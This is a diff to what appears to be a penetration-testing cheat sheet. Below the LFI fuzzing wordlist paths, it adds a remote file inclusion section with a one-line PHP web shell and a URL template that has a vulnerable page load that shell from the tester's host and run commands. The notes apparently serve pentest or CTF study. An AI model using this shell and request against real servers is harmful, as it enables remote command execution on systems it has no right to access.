@@ -80,6 +80,14 @@ Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-wi
 
 Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>
 
+#### RFI Payload
+
+<code><?php echo shell_exec($_GET['cmd']); ?></code>
+
+Store in a file on local host, navigate to it via the wb app and pass commands to it.
+
+<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=http://[LOCAL_IP]/rfi.txt&cmd=[COMMAND]</code>
+
 ## FTP 
 
 ### Brute Force
